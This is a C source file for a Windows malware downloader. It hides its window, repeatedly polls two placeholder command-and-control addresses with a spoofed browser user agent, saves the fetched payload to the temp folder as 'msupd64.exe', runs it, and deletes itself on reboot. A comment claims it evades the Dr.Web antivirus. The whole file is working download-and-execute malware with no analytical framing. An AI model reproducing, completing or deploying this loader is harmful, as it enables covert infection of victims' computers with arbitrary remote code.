#include <Windows.h>
#include <stdio.h>
#include <Winhttp.h>
#include <Shlobj.h>
#include <Urlmon.h>
#include <Shlwapi.h>

#pragma comment(linker, "/SUBSYSTEM:WINDOWS") // bye-bye dr.web :p
#pragma comment(lib, "winhttp")
#pragma comment(lib, "shell32")
#pragma comment(lib, "urlmon")
#pragma comment(lib, "Shlwapi")
#pragma comment(lib, "user32")
#pragma comment(lib, "ws2_32")

char bAddress1[] = "ADDRESS1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
char bAddress2[] = "ADDRESS2\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00";
unsigned long bBuildId = 0xdeadbee1;
unsigned long bInstanceId = 0xdeadbee2;

wchar_t sAddress1[35]	= {0};
wchar_t sAddress2[35]	= {0};
wchar_t sHttpRsrc[50]	= {0};
wchar_t sUserAgent[] = L"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11";

int poll(wchar_t *host);
void decode_params();

typedef BOOL (WINAPI *CREATEPROC)(
	__in_opt     LPCTSTR lpApplicationName,
	__inout_opt  LPTSTR lpCommandLine,
	__in_opt     LPSECURITY_ATTRIBUTES lpProcessAttributes,
	__in_opt     LPSECURITY_ATTRIBUTES lpThreadAttributes,
	__in         BOOL bInheritHandles,
	__in         DWORD dwCreationFlags,
	__in_opt     LPVOID lpEnvironment,
	__in_opt     LPCTSTR lpCurrentDirectory,
	__in         LPSTARTUPINFO lpStartupInfo,
	__out        LPPROCESS_INFORMATION lpProcessInformation
	);


#define POLL_TIME 1800000

int APIENTRY WinMain(HINSTANCE hInstance,
                     HINSTANCE hPrevInstance,
                     LPTSTR    lpCmdLine,
                     int       nCmdShow)
{
	HWND hWnd = GetConsoleWindow();
	ShowWindow(hWnd, SW_HIDE);

	decode_params();

	poll(sAddress1);
	poll(sAddress2);

	while(1)
	{
		Sleep(POLL_TIME);
		poll(sAddress1);
		poll(sAddress2);
	}
}


int poll(wchar_t *host)
{
	STARTUPINFO sinfo = {0};
	PROCESS_INFORMATION pinfo = {0};

	HINTERNET hSession = WinHttpOpen(sUserAgent,
		WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
		WINHTTP_NO_PROXY_NAME,
		WINHTTP_NO_PROXY_BYPASS,
		NULL);
	if (!hSession)
		return 0;


	HINTERNET hConnect = WinHttpConnect(hSession,
		host,
		INTERNET_DEFAULT_HTTP_PORT,
		0);
	if (!hConnect)
	{
		WinHttpCloseHandle(hSession);
		return 0;
	}

	HINTERNET hRequest = WinHttpOpenRequest(hConnect,
		L"GET",
		sHttpRsrc,
		NULL,
		WINHTTP_NO_REFERER,
		WINHTTP_DEFAULT_ACCEPT_TYPES,
		WINHTTP_FLAG_BYPASS_PROXY_CACHE|WINHTTP_FLAG_REFRESH);
	if (!hRequest)
	{
		WinHttpCloseHandle(hSession);
		WinHttpCloseHandle(hConnect);
		return 0;
	}

	WinHttpSetTimeouts(hRequest, 20000, 60000, 30000, 30000);

	BOOL ret = WinHttpSendRequest(hRequest,
		WINHTTP_NO_ADDITIONAL_HEADERS ,
		0,
		NULL,
		0,
		0,
		NULL);
	if (!ret)
		goto bailout;

	ret = WinHttpReceiveResponse(hRequest, NULL);
	if (!ret)
		goto bailout;

	DWORD BuffLen = 20;
	LPVOID HttpStatus = new WCHAR[20];
	ret = WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE, WINHTTP_HEADER_NAME_BY_INDEX, HttpStatus, &BuffLen, WINHTTP_NO_HEADER_INDEX);
	if (!ret)
		goto bailout;

	if (memcmp(HttpStatus, "\x32\x00\x30\x00\x30", 5))
		goto bailout;

	ULONG dwAvailableSize, dwReadSize, dwTotalSize;
	LPSTR sDownloadBuffer = (LPSTR)malloc(1024*1024*10);
	memset(sDownloadBuffer, 0x0, 1024*1024*10);
	dwAvailableSize = dwReadSize = dwTotalSize = 0;
	do 
	{
		dwAvailableSize = dwReadSize = 0;
		if (!WinHttpQueryDataAvailable(hRequest, &dwAvailableSize))
		{
			free(sDownloadBuffer);
			goto bailout;
		}
		if (!dwReadSize)
			break;

		if (!WinHttpReadData(hRequest, (LPVOID)(sDownloadBuffer+dwTotalSize), dwAvailableSize, &dwReadSize))
		{
			free(sDownloadBuffer);
			goto bailout;
		}

		dwTotalSize += dwReadSize;
	} while (dwAvailableSize > 0);


	/* download & exec */
	LPSTR TmpPath = (LPSTR)malloc(MAX_PATH);
	memset(TmpPath, 0x0, MAX_PATH);
	if (!GetTempPath(MAX_PATH, TmpPath))
		goto bailout;
	strcat(TmpPath, "\\msupd64.exe");

	HANDLE hFile = CreateFile(TmpPath,
		GENERIC_WRITE,
		0,
		NULL,
		CREATE_ALWAYS,
		FILE_ATTRIBUTE_NORMAL,
		NULL);


	ULONG dwWritten = 0;
	WriteFile(hFile, sDownloadBuffer, dwTotalSize, &dwWritten, NULL);

	/*
	URLDownloadToFile(NULL,
		"http://the.earth.li/~sgtatham/putty/latest/x86/putty.exe",
		TmpPath,
		NULL,
		NULL);
	*/

	CREATEPROC fpCreateProcess = (CREATEPROC)GetProcAddress(GetModuleHandle("kernel32"), "CreateProcessA");
	fpCreateProcess(NULL,
		TmpPath,
		NULL,
		NULL,
		FALSE,
		0,
		NULL,
		NULL,
		&sinfo,
		&pinfo);


	LPSTR OwnPath = (LPSTR)malloc(MAX_PATH);
	GetModuleFileName(NULL, OwnPath, MAX_PATH);
	MoveFileEx(OwnPath, NULL, MOVEFILE_DELAY_UNTIL_REBOOT);

	ExitProcess(0);

	return 1;

bailout:
	WinHttpCloseHandle(hSession);
	WinHttpCloseHandle(hConnect);
	WinHttpCloseHandle(hRequest);

	return 0;
	
}


void decode_params()
{
	LPSTR temp = (LPSTR)malloc(1024);

	/* ip addresses 1 */
	MultiByteToWideChar(CP_ACP,
		0,
		bAddress1,
		strlen(bAddress1),
		sAddress1,
		35);	
	/* ip addresses 2 */
	MultiByteToWideChar(CP_ACP,
		0,
		bAddress2,
		strlen(bAddress2),
		sAddress2,
		35);

	/* URI */
	memset(temp, 0x0, 1024);
	sprintf(temp, "/gh/%u/%x", bBuildId, bInstanceId);
	MultiByteToWideChar(CP_ACP,
		0,
		temp,
		strlen(temp),
		sHttpRsrc,
		25);

	free(temp);
}
